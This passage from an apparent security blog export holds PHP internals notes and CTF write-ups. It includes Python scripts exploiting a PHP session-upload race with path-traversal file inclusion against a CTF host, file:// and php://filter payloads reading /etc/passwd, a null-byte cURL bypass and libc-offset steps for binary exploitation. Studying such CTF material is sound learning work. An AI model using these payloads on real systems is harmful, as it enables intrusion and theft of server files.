其实文中说的request_order默认值变成GP，指的是第2种情况。也就是说，如果一个完全没有任何php.ini文件的php环境，其默认的request_order，仍然是GPC，而非GP。 我们可以来实验一下，首先用docker启动一个php环境（docker的php环境是没有php.ini的）： </p>\n<blockquote>\n<p>docker run –rm –name php1 -it -p 8080:80 -v <code>pwd</code>:/var/www/html php:7.2-apache </p>\n</blockquote>\n<p>再用docker启动一个默认的debian环境，并用apt源安装php5：</p>\n<blockquote>\n<p>docker run –rm –name php2 -it -p 8081:80 -v <code>pwd</code>:/var/www/html debian:8 bash apt-get update &amp;&amp; apt-get install -y php5 </p>\n<p>php -S 0.0.0.0:80 -t /var/www/html </p>\n</blockquote>\n<p>然后，我们输出一下两个环境的request_order取值，以及\\$_REQUEST变量：图2。 可见，在request_order为空的时候，\\$_REQUEST可以取到$_COOKIE中的值；而request_order=GP的时候，就已经取不到了。我们查看第二个环境的php.ini文件，也可以看到request_order的取值：图3。</p>\n<p> 所以，这两种默认值的含义，需要区分清楚，避免出现错误。</p>\n<p>图二:</p>\n<p><img src=\"https://file.zsxq.com/1d6/59/d659ac1a237468325de98f2cfc0802548d77e8a7ebd9d1a80d0390d2d0b2b7e2.png\" alt=\"\"></p>\n<p>图三:</p>\n<p><img src=\"https://file.zsxq.com/164/c8/64c85402cb752d1d7a5a2fbec6bf434338de9526b3836c08c28cb9382609a720.png\" alt=\"\"></p>\n<p>win10: 本地win10+phpstudy+apache中5.3.29-nts与5.4.45-nts中的requests_order方式是”CGP”</p>\n<p>除了默认php配置，还有两个配置项我没说。在编译PHP的时候，我们可以指定–with-config-file-path和–with-config-file-scan-dir。`</p>\n<p> 这两个配置项的意思是，PHP会在–with-config-file-path指定的目录下寻找php.ini文件，如果找到则加载之；除此之外，PHP还会在–with-config-file-scan-dir指定的目录下，寻找所有以.ini为后缀的文件，加载其为配置文件，这个配置是可以覆盖php.ini中配置的。 所以，通常用apt-get install php-pdo来安装php扩展，都会在–with-config-file-scan-dir下写入新的配置文件，而不是修改php.ini。 </p>\n<p>这样，我们如果遇到phpinfo页面，即可用过这两个配置项，来定位php.ini以及额外配置文件的位置。甚至来说，如果这两个目录可写，我们就能写入自己的php配置，进而达成跨站、提权等目的。</p>\n<p>图四:</p>\n<p><img src=\"https://file.zsxq.com/148/e0/48e0d690fe8697f0a4129a049f1710a345dc94fd92d01dc4ba174f51ca695580.png\" alt=\"\"></p>\n<h2 id=\"SAPI\"><a href=\"#SAPI\" class=\"headerlink\" title=\"SAPI\"></a>SAPI</h2><p>见图5，Server API 指的是当前PHP运行在哪一种模式下。SAPI是PHP内核的一个概念，相当于是PHP核心解释器和应用层（如Web中间件）的一个桥梁。我们需要在SAPI里实现一些函数，供PHP底层调用。 </p>\n<p>这篇文章（ <a href=\"https://foio.github.io/php-sapi/\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://foio.github.io/php-sapi/\" target=\"_blank\" rel=\"noopener\">理解php内核中SAPI的作用 – 积木村の研究所</a> ）里举了个简单的例子：cli和cgi这两个SAPI，均需要实现sapi_cgi_read_cookies函数，但cli模式下没有cookie，所以该函数返回null；cgi模式下，cookie从HTTP头中获取，所以返回的是getenv(“HTTP_COOKIE”)。 </p>\n<p>下面介绍一些常用的SAPI。 图5中的FPM/FastCGI指的就是一种SAPI，其提供了一种以fastcgi协议和Web中间件（如Nginx）通信的接口，具体流程可以阅读我的这篇文章（ <a href=\"https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html\" target=\"_blank\" rel=\"noopener\">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写 | 离别歌</a>  ）。</p>\n<p>图5:</p>\n<p><img src=\"https://file.zsxq.com/1a0/72/a072352975fb3a7f091f12f1f51c359d246c1ea1dded3a33be4300fc81d143c8.png\" alt=\"\"></p>\n<p> PHP为Apache提供了一个专用了SAPI——Apache 2.0 Handler。相当于是把PHP编译成一个动态链接库，作为Apache的一个模块。</p>\n<p> 当然，Apache也不一定必须用这种SAPI，他同样也支持用Fastcgi和PHP-FPM通信。所以，即使你在实战中遇到了服务器是Apache的环境，也不能就此认定其一定存在Apache模块。你可以尝试下载一个PHPStudy，来看看是否有apache_get_version函数，答案是否定的。 我们平时在命令行里运行PHP，比如php -i （在命令行下执行phpinfo的方法），你可以看到此时的Server API是“Command Line Interface”：图6。</p>\n<p>图6:</p>\n<p><img src=\"https://file.zsxq.com/1b6/61/b661242ec92dae5334dd695b75c7a3ad2f8a028c8cbc59151eec9230cc7d9a45.png\" alt=\"\"></p>\n<p>这个SAPI就是给命令行用的。 </p>\n<p>另外，PHP5.4及以后，我们可以用 php -S localhost:8080 来启动PHP内置的Web server。这个Web server其实也是一个SAPI，名为“Built-in HTTP server”：图7。 </p>\n<p>图7:</p>\n<p><img src=\"https://file.zsxq.com/1b2/bb/b2bbf2fcb9f5d5088f55dc290570ba84f8c0cc86af9786bbaa5b02b77372fdb8.png\" alt=\"PHP\"> </p>\n<p>Built-in Server相当于实现了一个Web文件服务器，然后将PHP有关的请求发给“Built-in HTTP server”这个SAPI，最终交给解释器解析。 </p>\n<p>在很古老的时候，rfc3875（ <a href=\"http://www.ietf.org/rfc/rfc3875\" target=\"_blank\" rel=\"noopener\">链接：http://www.ietf.org/rfc/rfc3875</a> ）定义了一种运行Web应用的方法——CGI，PHP也为其提供了名为“CGI/FastCGI”的SAPI，不过用的比较少，不介绍了。 </p>\n<p>除此之外，还有一个比较有意思的SAPI，叫embed，这是一个嵌入式SAPI。这个功能就很有意思了，我们能很容易地将PHP解释器集成到自己的程序里。比如Laruence在08年曾写过一篇《使用PHP Embed SAPI实现Opcodes查看器》的文章：<a href=\"http://www.laruence.com/2008/09/23/539.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://www.laruence.com/2008/09/23/539.html\" target=\"_blank\" rel=\"noopener\">使用PHP Embed SAPI实现Opcodes查看器 | 风雪之隅</a> 。 </p>\n<p>原理也比较简单，就是在外部调用PHP内核的zend_compile_file函数，将代码转换成OPCODE，然后输出。</p>\n<p> uwsgi的PHP插件，也是利用内嵌embed的PHP，我们可以在 <a href=\"https://github.com/vulhub/vulhub/blob/master/base/uwsgi/php/2.0.16/Dockerfile\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://github.com/vulhub/vulhub/blob/master/base/uwsgi/php/2.0.16/Dockerfile\" target=\"_blank\" rel=\"noopener\">vulhub/Dockerfile at master · vulhub/vulhub · GitH…</a> 看到整个编译的过程。 </p>\n<p>phpdbg是php5.4及以后加入的一个php交互式调试器，他也是一个sapi。</p>\n<h2 id=\"php支持的协议\"><a href=\"#php支持的协议\" class=\"headerlink\" title=\"php支持的协议\"></a>php支持的协议</h2><p>图8，Registered PHP Streams中列出了PHP默认支持的一些协议。 我们来一一介绍一下。 </p>\n<p>https和http自然不用说，用来包装http协议，我们可以执行readfile(‘<a href=\"http://www.example.com/\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://www.example.com/\" target=\"_blank\" rel=\"noopener\">Example Domain</a>‘);来发送一个http请求。 </p>\n<p>ftps和ftp，用来包装ftp协议，和http类似。 </p>\n<p>compress.zlib用来处理zlib压缩过的数据，比如我们可以用readfile(‘compress.zlib://file.gz’);来读取用zlib压缩过的文件。 </p>\n<p>php是php特有的协议，用其可以访问输入输出流，并进行过滤、编码等操作。其支持的功能有很多，可以参考这个文档：<a href=\"http://php.net/manual/zh/wrappers.php.php\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://php.net/manual/zh/wrappers.php.php\" target=\"_blank\" rel=\"noopener\">PHP: php:// - Manual</a> </p>\n<p>file用来访问本地文件，比如readfile(‘file:///etc/passwd’);</p>\n<p> glob用来以模式匹配的方式访问本地目录，比如 dir(‘glob:///etc/*’)。 </p>\n<p>data可以用url的方式来模拟一个输入流（RFC 2397），比如，readfile通常是用来读取文件中的内容，但我们可以通过 readfile(‘data://text/plain;base64,SGVsbG8=’); 来解码base64串，并将其作为输入流读取。 </p>\n<p>phar是用来读写PHP归档，PHP归档类似于Java的.jar文件，我们可以将一个完整的PHP项目（可能包含数百个文件）打包成一个.phar，比如composer.phar。phar流就负责读写这个文件。</p>\n<p> 除此之外，常见的协议还有zip://，用来读写zip格式的压缩文件；</p>\n<p>compress.bzip2://用来读写bz2压缩的文件。这些协议可能需要额外安装扩展。</p>\n<p>另外，用户也可以定义自己的流，即实现streamWrapper类中的方法，这块我就不介绍了。</p>\n<p>图8:</p>\n<p><img src=\"https://file.zsxq.com/179/b6/79b6f16973ae9a0c370e62e0f7fa11f401121107e39d1ac9bc0e6a486ba8075d.png\" alt=\"\"></p>\n<h2 id=\"Registered-Stream-Filters\"><a href=\"#Registered-Stream-Filters\" class=\"headerlink\" title=\"Registered Stream Filters\"></a>Registered Stream Filters</h2><p>Registered Stream Filters列出了一些默认支持的filter流。（图9） 其实PHP中的filter流，是和协议密不可分的。协议的作用是读写文件（包括正常文件、目录、输入输出等），而filter流的作用就是在读写的中途对数据进行过滤和编码，相当于是一个HOOK。 </p>\n<p>zlib.*用来压缩和解压数据，和compress.zlib://协议不同的是，用zlib流可以压缩、解压任何其他协议里传输的数据。 </p>\n<p>convert.iconv.*用来转换编码。 </p>\n<p>string.*用来做字符串转换，比如string.strip_tags用来去除字符串中的标签，string.tolower用来将字符串转换成小写。 </p>\n<p>convert.*用来转换数据，比如用convert.base64-decode可以做base64的解码。其实我觉得放在string.*里也可以。 </p>\n<p>dechunk用来处理chunk相关的数据，chunk是HTTP1.1中传输流式数据的方式（ <a href=\"https://en.wikipedia.org/wiki/Chunked_transfer_encoding\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://en.wikipedia.org/wiki/Chunked_transfer_encoding\" target=\"_blank\" rel=\"noopener\">Chunked transfer encoding - Wikipedia</a> ），用这个filter流就能将chunk解开。 consumed应该是用来计算数据字符数量的。</p>\n<p> 在PHP里，我们可以用stream_filter_append函数将上述流，附加在某个输入输出资源上。当然，更常见的用法是，我们可以用php://filter协议来使用上述流，比如 readfile(‘php://filter/read=convert.base64-encode/resource=/etc/passwd’); 关于php://filter的一些有趣的技巧，可以阅读这篇文章 <a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\" target=\"_blank\" rel=\"noopener\">谈一谈php://filter的妙用 | 离别歌</a>  。</p>\n<p>图9:</p>\n<p><img src=\"https://file.zsxq.com/142/62/426224a833018047b952319a5e72bea0f85227707d522c748fa533acf12f6b17.png\" alt=\"\"></p>\n<h2 id=\"session-uplaod\"><a href=\"#session-uplaod\" class=\"headerlink\" title=\"session uplaod\"></a>session uplaod</h2><p>图10:</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7ddab932-75fc-1.png\" alt=\"\"></p>\n<p><code>session.upload_progress.enabled = on</code> 说明可以覆盖session</p>\n<p><code>clean up</code>说明需要竞争</p>\n<p>图11：</p>\n<p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20180622171313-7dcda382-75fc-1.png\" alt=\"\"></p>\n<p>sessionupload.py</p>\n<pre><code>#!coding:utf-8\nimport requests\nimport time\n\nurl = &#39;http://116.62.71.206:52872/?f=login.php&#39;\ndata = {&#39;name&#39;:&#39;admin&#39;,&#39;pass&#39;:&#39;sctf2018_h656cDBkU2&#39;}\n\nr = requests.post(url,data = data)\nPHPSESSID = r.cookies[&#39;PHPSESSID&#39;]\nprint &#39;input the PHPSESSID in include.py&#39; +&#39;\\n&#39; + PHPSESSID\ntime.sleep(10)\n\nwhile 1:\n    url = &#39;http://116.62.71.206:52872/?f=upload_sctf2018_C9f7y48M75.php&#39;\n    files = { \n    &quot;PHP_SESSION_UPLOAD_PROGRESS&quot; : (None,&#39;&lt;?php echo file_get_contents(&quot;/tmp/flag_56CcE97QGNxDEXNpW3HY&quot;);?&gt;&#39;),  \n\n    &quot;upload&quot; : (&quot;tmp.jpg&quot;, open(&quot;tmp.png&quot;, &quot;rb&quot;), &quot;image/png&quot;), \n\n    &quot;submit&quot; : (None,&quot;submit&quot;)\n    }  \n    #proxies = {&#39;http&#39;:&#39;http://127.0.0.1:8080&#39;}\n    headers = {&#39;Cookie&#39;:&#39;PHPSESSID=&#39; + PHPSESSID}\n    r = requests.post(url,files = files , headers = headers)\n    print r.text\n    print PHPSESSID\n    #开了cleanup，需要竞争，并且保持回话的session\n</code></pre><p>include.py</p>\n<pre><code>#!coding:utf-8\n\nimport requests\nPHPSESSID = &#39;qc2kavokdjiiepu283hduivod2&#39;\nwhile 1:\n    url = &#39;http://116.62.71.206:52872/?f=aa://../../../../var/lib/php/sessions/sess_&#39; + PHPSESSID\n    print url\n    r = requests.get(url)\n    if &#39;SCTF&#39; in r.text:\n        print r.text\n        break\n</code></pre><h2 id=\"案例\"><a href=\"#案例\" class=\"headerlink\" title=\"案例\"></a>案例</h2><p>以前我在博客里讲过不少和协议有关的安全tricks，大家也分享过一些，今天来温故一下。 </p>\n<p>利用php filter绕过死亡exit：<a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"https://www.leavesongs.com/PENETRATION/php-filter-magic.html\" target=\"_blank\" rel=\"noopener\">谈一谈php://filter的妙用 | 离别歌</a> </p>\n<p>利用phar/zip协议绕过有后缀的文件包含：include zip:///var/www/html/upload/1.gif#1.php </p>\n<p>利用curl+gopher协议进行SSRF漏洞利用： <a href=\"http://blog.neargle.com/SecNewsBak/drops/Do%20Evil%20Things%20with%20gopher%20.html\" target=\"_blank\" rel=\"noopener\">链接：</a><a href=\"http://blog.neargle.com/SecNewsBak/drops/Do%20Evil%20Things%20with%20gopher%20.html\" target=\"_blank\" rel=\"noopener\">Do Evil Things with gopher://</a> </p>\n<p>SSRF检查host时进行文件读取：file://localhost/etc/passwd </p>\n<p>利用php协议+zlib.inflate流压缩数据，突破libxml解析器限制的实体长度 </p>\n<p>php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd</p>"},{"title":"parse_url + curl","date":"2018-04-24T01:55:40.000Z","_content":"\n# parse_url + curl\n\nLet's open the URL and prod around. We find a search box, which can retrieve the source code of any page on https://www.google.com.\n\n1. Different hostnames are all blocked. Examples are:\n  * `evil.com` \n  * hostnames that include `www.google.com` such as `www.google.com.evil.com` \n  * URLs that include google.com such as `www.evil.com/http://www.google.com`\n2. [php:// filter urls](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/) do not work.\n3. Appending a null byte to the query, i.e., `site=http%3A%2F%2Fwww.google.com%00` gives a warning: `curl_setopt(): Curl option contains invalid characters (\\0)`\n  * So null bytes are detected and blocked\n  * We now know that the backend used is cURL\n4. Googling for this error then leads to https://bugs.php.net/bug.php?id=68089\n  * This has a nice example: `file:///etc/passwd%00http://google.com`\n  * Apparently cURL also understands `file://` urls!\n  * If you read carefully, you'll notice that this specific vulnerability is not addressed in PHP as it's considered a cURL issue\n5. First focusing on the `file://` protocol: we notice that this protocol is supported, as `file://www.google.com` returns a _different_ error than before.\n6. Testing locally, we find that `file://www.google.com/../etc/passwd` in fact reads `/etc/passwd`. However, search-box appends a `/`\n   to the end of the url, which means the code would try to read `/etc/passwd/`, which of course doesn't exist.\n7. Combining the two, we can send the null byte URLencoded to cURL. So the final attack URL becomes something like\n   `file://www.google.com/../etc/flag.txt%00`. The final request thus becomes\n   http://search-box.web1.sunshinectf.org/?submit=Submit&site=file%3A%2F%2Fwww.google.com%2F..%2Fetc%2Fflag.txt%2500\n   and this finally gets us the flag.\n8. file://user@127.0.0.1:80@www.google.com/etc/flag.txt\n9. file://user@127.0.0.1:80@www.google.com/etc/flag.txt#","source":"_posts/parse_url+curl.md","raw":"---\ntitle: parse_url + curl\ndate: 2018-04-24 9:55:40\ntags:\n---\n\n# parse_url + curl\n\nLet's open the URL and prod around. We find a search box, which can retrieve the source code of any page on https://www.google.com.\n\n1. Different hostnames are all blocked. Examples are:\n  * `evil.com` \n  * hostnames that include `www.google.com` such as `www.google.com.evil.com` \n  * URLs that include google.com such as `www.evil.com/http://www.google.com`\n2. [php:// filter urls](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/) do not work.\n3. Appending a null byte to the query, i.e., `site=http%3A%2F%2Fwww.google.com%00` gives a warning: `curl_setopt(): Curl option contains invalid characters (\\0)`\n  * So null bytes are detected and blocked\n  * We now know that the backend used is cURL\n4. Googling for this error then leads to https://bugs.php.net/bug.php?id=68089\n  * This has a nice example: `file:///etc/passwd%00http://google.com`\n  * Apparently cURL also understands `file://` urls!\n  * If you read carefully, you'll notice that this specific vulnerability is not addressed in PHP as it's considered a cURL issue\n5. First focusing on the `file://` protocol: we notice that this protocol is supported, as `file://www.google.com` returns a _different_ error than before.\n6. Testing locally, we find that `file://www.google.com/../etc/passwd` in fact reads `/etc/passwd`. However, search-box appends a `/`\n   to the end of the url, which means the code would try to read `/etc/passwd/`, which of course doesn't exist.\n7. Combining the two, we can send the null byte URLencoded to cURL. So the final attack URL becomes something like\n   `file://www.google.com/../etc/flag.txt%00`. The final request thus becomes\n   http://search-box.web1.sunshinectf.org/?submit=Submit&site=file%3A%2F%2Fwww.google.com%2F..%2Fetc%2Fflag.txt%2500\n   and this finally gets us the flag.\n8. file://user@127.0.0.1:80@www.google.com/etc/flag.txt\n9. file://user@127.0.0.1:80@www.google.com/etc/flag.txt#","slug":"parse_url+curl","published":1,"updated":"2018-04-24T02:10:05.969Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjity3jpj000kly4jjia0q3d5","content":"<h1 id=\"parse-url-curl\"><a href=\"#parse-url-curl\" class=\"headerlink\" title=\"parse_url + curl\"></a>parse_url + curl</h1><p>Let’s open the URL and prod around. We find a search box, which can retrieve the source code of any page on <a href=\"https://www.google.com\" target=\"_blank\" rel=\"noopener\">https://www.google.com</a>.</p>\n<ol>\n<li>Different hostnames are all blocked. Examples are:<ul>\n<li><code>evil.com</code> </li>\n<li>hostnames that include <code>www.google.com</code> such as <code>www.google.com.evil.com</code> </li>\n<li>URLs that include google.com such as <code>www.evil.com/http://www.google.com</code></li>\n</ul>\n</li>\n<li><a href=\"https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/\" target=\"_blank\" rel=\"noopener\">php:// filter urls</a> do not work.</li>\n<li>Appending a null byte to the query, i.e., <code>site=http%3A%2F%2Fwww.google.com%00</code> gives a warning: <code>curl_setopt(): Curl option contains invalid characters (\\0)</code><ul>\n<li>So null bytes are detected and blocked</li>\n<li>We now know that the backend used is cURL</li>\n</ul>\n</li>\n<li>Googling for this error then leads to <a href=\"https://bugs.php.net/bug.php?id=68089\" target=\"_blank\" rel=\"noopener\">https://bugs.php.net/bug.php?id=68089</a><ul>\n<li>This has a nice example: <code>file:///etc/passwd%00http://google.com</code></li>\n<li>Apparently cURL also understands <code>file://</code> urls!</li>\n<li>If you read carefully, you’ll notice that this specific vulnerability is not addressed in PHP as it’s considered a cURL issue</li>\n</ul>\n</li>\n<li>First focusing on the <code>file://</code> protocol: we notice that this protocol is supported, as <code>file://www.google.com</code> returns a <em>different</em> error than before.</li>\n<li>Testing locally, we find that <code>file://www.google.com/../etc/passwd</code> in fact reads <code>/etc/passwd</code>. However, search-box appends a <code>/</code><br>to the end of the url, which means the code would try to read <code>/etc/passwd/</code>, which of course doesn’t exist.</li>\n<li>Combining the two, we can send the null byte URLencoded to cURL. So the final attack URL becomes something like<br><code>file://www.google.com/../etc/flag.txt%00</code>. The final request thus becomes<br><a href=\"http://search-box.web1.sunshinectf.org/?submit=Submit&amp;site=file%3A%2F%2Fwww.google.com%2F..%2Fetc%2Fflag.txt%2500\" target=\"_blank\" rel=\"noopener\">http://search-box.web1.sunshinectf.org/?submit=Submit&amp;site=file%3A%2F%2Fwww.google.com%2F..%2Fetc%2Fflag.txt%2500</a><br>and this finally gets us the flag.</li>\n<li>file://user@127.0.0.1:80@www.google.com/etc/flag.txt</li>\n<li>file://user@127.0.0.1:80@www.google.com/etc/flag.txt#</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"parse-url-curl\"><a href=\"#parse-url-curl\" class=\"headerlink\" title=\"parse_url + curl\"></a>parse_url + curl</h1><p>Let’s open the URL and prod around. We find a search box, which can retrieve the source code of any page on <a href=\"https://www.google.com\" target=\"_blank\" rel=\"noopener\">https://www.google.com</a>.</p>\n<ol>\n<li>Different hostnames are all blocked. Examples are:<ul>\n<li><code>evil.com</code> </li>\n<li>hostnames that include <code>www.google.com</code> such as <code>www.google.com.evil.com</code> </li>\n<li>URLs that include google.com such as <code>www.evil.com/http://www.google.com</code></li>\n</ul>\n</li>\n<li><a href=\"https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/\" target=\"_blank\" rel=\"noopener\">php:// filter urls</a> do not work.</li>\n<li>Appending a null byte to the query, i.e., <code>site=http%3A%2F%2Fwww.google.com%00</code> gives a warning: <code>curl_setopt(): Curl option contains invalid characters (\\0)</code><ul>\n<li>So null bytes are detected and blocked</li>\n<li>We now know that the backend used is cURL</li>\n</ul>\n</li>\n<li>Googling for this error then leads to <a href=\"https://bugs.php.net/bug.php?id=68089\" target=\"_blank\" rel=\"noopener\">https://bugs.php.net/bug.php?id=68089</a><ul>\n<li>This has a nice example: <code>file:///etc/passwd%00http://google.com</code></li>\n<li>Apparently cURL also understands <code>file://</code> urls!</li>\n<li>If you read carefully, you’ll notice that this specific vulnerability is not addressed in PHP as it’s considered a cURL issue</li>\n</ul>\n</li>\n<li>First focusing on the <code>file://</code> protocol: we notice that this protocol is supported, as <code>file://www.google.com</code> returns a <em>different</em> error than before.</li>\n<li>Testing locally, we find that <code>file://www.google.com/../etc/passwd</code> in fact reads <code>/etc/passwd</code>. However, search-box appends a <code>/</code><br>to the end of the url, which means the code would try to read <code>/etc/passwd/</code>, which of course doesn’t exist.</li>\n<li>Combining the two, we can send the null byte URLencoded to cURL. So the final attack URL becomes something like<br><code>file://www.google.com/../etc/flag.txt%00</code>. The final request thus becomes<br><a href=\"http://search-box.web1.sunshinectf.org/?submit=Submit&amp;site=file%3A%2F%2Fwww.google.com%2F..%2Fetc%2Fflag.txt%2500\" target=\"_blank\" rel=\"noopener\">http://search-box.web1.sunshinectf.org/?submit=Submit&amp;site=file%3A%2F%2Fwww.google.com%2F..%2Fetc%2Fflag.txt%2500</a><br>and this finally gets us the flag.</li>\n<li>file://user@127.0.0.1:80@www.google.com/etc/flag.txt</li>\n<li>file://user@127.0.0.1:80@www.google.com/etc/flag.txt#</li>\n</ol>\n"},{"title":"pwn前置知识","date":"2018-06-08T01:46:21.000Z","_content":"\n## 调用约定\n\n32位和64位程序的区别, 更多的是体现在[调用约定(Calling Convention)](https://en.wikipedia.org/wiki/X86_calling_conventions)上. 因为64位程序有了更多的通用寄存器, 所以通常会使用寄存器来进行函数参数传递 而不是通过栈, 来获得更高的运行速度.\n\n本文主要是介绍Linux平台下的漏洞利用, 所以就专注于`System V AMD64 ABI` 的调用约定, 即函数参数从左到右依次用寄存器RDI,RSI,RDX,RCX,R8,R9来进行传递, 如果参数个数多于6个, 再通过栈来进行传递.\n\n```\n$ cat victim.c\nint foo(int a, int b, int c,  int d,  int e,  int f,  int g,  int h) {\n    return a + b + c + d + e + f + g + h;\n}\nint main() {\n    foo(1, 2, 3, 4, 5, 6, 7, 8);\n    return 0;\n}\n$ gcc victim.c -o victim\n$ objdump -d victim | grep \"<main>:\" -A 11\n00000000000006a0 <main>:\n 6a0:   55                      push   rbp\n 6a1:   48 89 e5                mov    rbp,rsp\n 6a4:   6a 08                   push   0x8\n 6a6:   6a 07                   push   0x7\n 6a8:   41 b9 06 00 00 00       mov    r9d,0x6\n 6ae:   41 b8 05 00 00 00       mov    r8d,0x5\n 6b4:   b9 04 00 00 00          mov    ecx,0x4\n 6b9:   ba 03 00 00 00          mov    edx,0x3\n 6be:   be 02 00 00 00          mov    esi,0x2\n 6c3:   bf 01 00 00 00          mov    edi,0x1\n 6c8:   e8 93 ff ff ff          call   660 <foo>\n```\n\n## 查找libc基地址\n\n方法一:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ LD_TRACE_LOADED_OBJECTS=1 ./vuln\n\tlinux-vdso.so.1 (0x00007ffff7ffa000)\n\tlibc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e4000)\n\t/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd5000)\n```\n\n方法二:\n\n首先查找libc中某一函数的偏移，以system为例:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system@\n   607: 000000000004f440    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE\n  1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5\n```\n\n或者使用ida也可以查找函数的偏移。\n\n寻找system的绝对地址：\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...done.\ngdb-peda$ p system\n$1 = {<text variable, no debug info>} 0x5d0 <system@plt>\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln \nasdf\nasdf\n\n[Inferior 1 (process 7107) exited normally]\nWarning: not running or target is remote\ngdb-peda$ p system\n$2 = {int (const char *)} 0x7ffff7a33440 <__libc_system>\n```\n\n然后就可以计算libc的基地址:\n\n>  0x7ffff7a33440 - 0x4f440 = 0x7ffff79e4000\n\n## 查找\"/bin/sh\"的偏移地址\n\n方法一:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -z -s /bin/sh /lib/x86_64-linux-gnu/libc.so.6\n0x1b3e9a\n```\n\n方法二:\n\n在ida中查找。\n\n方法三:\n\n在环境变量中查找。\n\n```shell\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...done.\ngdb-peda$ b *main\nBreakpoint 2 at 0x555555554739: file vuln.c, line 17.\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln \n\n[----------------------------------registers-----------------------------------]\nRAX: 0x555555554739 (<main>:\tpush   rbp)\nRBX: 0x0 \nRCX: 0x555555554790 (<__libc_csu_init>:\tpush   r15)\nRDX: 0x7fffffffddf8 --> 0x7fffffffe1c7 (\"CLUTTER_IM_MODULE=xim\")\nRSI: 0x7fffffffdde8 --> 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\nRDI: 0x1 \nRBP: 0x555555554790 (<__libc_csu_init>:\tpush   r15)\nRSP: 0x7fffffffdd08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\nRIP: 0x555555554739 (<main>:\tpush   rbp)\nR8 : 0x7ffff7dd0d80 --> 0x0 \nR9 : 0x7ffff7dd0d80 --> 0x0 \nR10: 0x0 \nR11: 0x1 \nR12: 0x555555554610 (<_start>:\txor    ebp,ebp)\nR13: 0x7fffffffdde0 --> 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x55555555472a <shell+16>:\tcall   0x5555555545d0 <system@plt>\n   0x55555555472f <shell+21>:\tmov    edi,0x0\n   0x555555554734 <shell+26>:\tcall   0x5555555545f0 <exit@plt>\n=> 0x555555554739 <main>:\tpush   rbp\n   0x55555555473a <main+1>:\tmov    rbp,rsp\n   0x55555555473d <main+4>:\tsub    rsp,0x120\n   0x555555554744 <main+11>:\tmov    DWORD PTR [rbp-0x114],edi\n   0x55555555474a <main+17>:\tmov    QWORD PTR [rbp-0x120],rsi\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdd08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\n0008| 0x7fffffffdd10 --> 0x1 \n0016| 0x7fffffffdd18 --> 0x7fffffffdde8 --> 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0024| 0x7fffffffdd20 --> 0x100008000 \n0032| 0x7fffffffdd28 --> 0x555555554739 (<main>:\tpush   rbp)\n0040| 0x7fffffffdd30 --> 0x0 \n0048| 0x7fffffffdd38 --> 0xbd88a50cb0fd83be \n0056| 0x7fffffffdd40 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17\nwarning: Source file is more recent than executable.\n17\tint main(int argc, char* argv[]) {\ngdb-peda$ telescope 100\n0000| 0x7fffffffdd08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\n0008| 0x7fffffffdd10 --> 0x1 \n0016| 0x7fffffffdd18 --> 0x7fffffffdde8 --> 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0024| 0x7fffffffdd20 --> 0x100008000 \n0032| 0x7fffffffdd28 --> 0x555555554739 (<main>:\tpush   rbp)\n0040| 0x7fffffffdd30 --> 0x0 \n0048| 0x7fffffffdd38 --> 0xbd88a50cb0fd83be \n0056| 0x7fffffffdd40 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n0064| 